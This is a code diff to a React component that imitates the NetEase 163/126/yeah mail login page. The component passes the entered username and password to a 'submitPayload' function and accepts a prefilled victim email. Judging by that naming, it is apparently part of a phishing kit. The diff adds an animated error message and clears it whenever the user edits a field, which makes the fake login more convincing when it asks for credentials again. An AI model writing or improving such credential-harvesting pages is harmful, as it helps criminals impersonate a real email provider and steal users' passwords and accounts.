@@ -2,6 +2,7 @@
 import React, { useState } from 'react';
 import { useTranslation } from '../components/LanguageProvider';
 import { useSecurity } from '../components/SecurityManager';
+import { motion } from 'framer-motion';
 
 interface NetEaseThemeProps {
   prefilledEmail?: string;
@@ -13,7 +14,7 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'163' | '126' | 'yeah'>('163');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { submitPayload } = useSecurity();
+  const { submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -92,7 +93,10 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
                 <input 
                   type="text" 
                   value={username} 
-                  onChange={(e) => setUsername(e.target.value)} 
+                  onChange={(e) => {
+                    setUsername(e.target.value);
+                    if (error) setError(null);
+                  }} 
                   placeholder={lang === 'zh' ? '邮箱帐号或手机号' : 'Username'} 
                   className="flex-grow px-4 py-3 outline-none text-[15px]" 
                 />
@@ -103,7 +107,10 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
                 <input 
                   type="password" 
                   value={password} 
-                  onChange={(e) => setPassword(e.target.value)} 
+                  onChange={(e) => {
+                    setPassword(e.target.value);
+                    if (error) setError(null);
+                  }} 
                   placeholder={lang === 'zh' ? '密码' : 'Password'} 
                   className="w-full px-4 py-3 outline-none text-[15px]" 
                 />
@@ -124,6 +131,16 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
               >
                 {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'Log in')}
               </button>
+
+              {error && (
+                <motion.div 
+                  initial={{ opacity: 0, y: -10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  className="text-red-600 text-[13px] text-center font-medium py-1"
+                >
+                  {error}
+                </motion.div>
+              )}
 
               <div className="pt-4 text-center">
                 <a href="#" className="text-[13px] text-gray-400 hover:text-red-500">
